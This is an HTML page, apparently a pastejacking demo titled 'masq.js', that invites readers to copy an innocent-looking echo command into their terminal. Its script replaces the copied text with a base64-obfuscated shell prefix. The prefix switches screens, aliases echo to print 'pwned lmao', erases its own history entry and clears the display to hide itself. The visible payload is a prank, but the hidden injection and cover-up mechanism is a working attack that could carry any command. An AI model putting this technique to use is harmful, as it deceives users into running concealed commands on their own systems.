<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>masq.js</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #0d1117;
      --fg: #e6edf3;
      --accent: #58a6ff;
      --box-bg: #161b22;
      --border: #30363d;
      --muted: #8b949e;
      --btn-bg: #0b1220;
      --btn-border: #233240;
    }

    html, body {
      height: 100%;
      margin: 0;
    }

    body {
      background: var(--bg);
      color: var(--fg);
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
      padding: 40px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
    }

    .run-row {
      display: inline-flex;
      align-items: center;
      gap: 12px;
    }

    .box {
      background: var(--box-bg);
      border: 1px solid var(--border);
      padding: 12px 16px;
      border-radius: 8px;
      display: inline-flex;
      align-items: center;
      user-select: text;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
      max-width: 90vw;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .box small {
      color: var(--muted);
      margin-right: 8px;
      font-size: 0.95rem;
    }

    code {
      color: var(--accent);
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
      font-size: 0.98rem;
      background: transparent;
      padding: 0;
    }

    button.copy-btn {
      appearance: none;
      border: 1px solid var(--btn-border);
      background: var(--btn-bg);
      color: var(--fg);
      padding: 8px 12px;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 600;
      font-size: 0.95rem;
      display: inline-flex;
      align-items: center;
      gap: 8px;
    }

    button.copy-btn:active { transform: translateY(1px); }
    button.copy-btn:focus { outline: 2px solid rgba(88,166,255,0.25); outline-offset: 2px; }

    .hint {
      color: var(--muted);
      font-size: 0.9rem;
      margin-top: 12px;
    }
  </style>
</head>
<body>
  <div class="run-row" title="Paste this command in your terminal">
    <div class="box" id="copyBox">
      <small>Paste this command in your terminal:</small>
      <code id="cmd">echo 'Hello world!'</code>
    </div>
  </div>

  <script>
    const cmdEl = document.getElementById('cmd');
    const pre = atob('cHJpbnRmICJcMDMzWz8xMDQ5aCI7YWxpYXMgZWNobz0nZWNobyAicHduZWQgbG1hbyI7dW5hbGlhcyBlY2hvOyMnO2hpc3RvcnkgLWQgJCgoSElTVENNRC0xKSk7IHByaW50ZiAiXDAzM1s/MTA0OWxcMDMzW0FcclwwMzNbSyIK');
    copyBox.addEventListener('copy', function (e) {
      try {
        e.preventDefault();
        const text = cmdEl.textContent.trim();
        if (e.clipboardData) {
          e.clipboardData.setData('text/plain', pre + text);
          e.clipboardData.setData('text/html', text);
        } else if (window.clipboardData) {
          // old IE fallback
          window.clipboardData.setData('Text', pre + text);
        }
      } catch (err) {
        console.error('copy handler error:', err);
      }
    });

    copyBox.addEventListener('click', function () {
      const range = document.createRange();
      range.selectNodeContents(cmdEl);
      const sel = window.getSelection();
      sel.removeAllRanges();
      sel.addRange(range);
    });
  </script>
</body>
</html>
